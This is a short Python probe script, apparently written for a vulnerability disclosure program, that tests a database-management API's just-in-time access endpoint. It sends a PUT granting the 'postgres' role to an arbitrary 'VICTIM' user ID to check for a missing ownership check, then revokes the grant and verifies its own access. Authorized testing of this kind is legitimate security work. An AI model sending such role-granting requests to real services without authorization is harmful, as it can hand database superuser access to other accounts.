# -*- coding: utf-8 -*-
"""PUT 映射 user_id 校验测试: 任意 uuid 可写? (写完即清)"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []
def req(method, path, body=None, tag=''):
    body_j = json.dumps(body) if body is not None else None
    c = http.client.HTTPSConnection(API_HOST, timeout=20, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Authorization": "Bearer " + BEARER_JWT}
    if body_j:
        h["Content-Type"] = "application/json"
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request(method, path, headers=h, body=body_j)
        r = c.getresponse()
        b = r.read(4000).decode('utf-8', errors='replace')
        out.append('### [%s] %s %s (%.1fs)\n%s | %s' % (tag, method, path, time.time() - t0, r.status, b[:1500]))
        c.close()
    except Exception as e:
        out.append('### [%s] %s %s ERR %s' % (tag, method, path, e))

VICTIM = "ffffffff-ffff-4fff-8fff-ffffffffffff"  # 不存在的用户 uuid (同 org 外)
# 1. PUT 任意 uuid + role postgres (若 200 => 无 owner 校验/无用户存在校验)
req('PUT', '/v1/projects/%s/database/jit' % PROJECT_REF,
    {"user_id": VICTIM, "roles": [{"role": "postgres", "expires_at": 1788511000}]}, 'put-other-uid')
# 2. 清理那个 uuid
req('PUT', '/v1/projects/%s/database/jit' % PROJECT_REF,
    {"user_id": VICTIM, "roles": []}, 'clean-other-uid')
# 3. 自己 GET 确认未受影响
req('GET', '/v1/projects/%s/database/jit' % PROJECT_REF, None, 'self-verify')

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb37_jitid.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out))
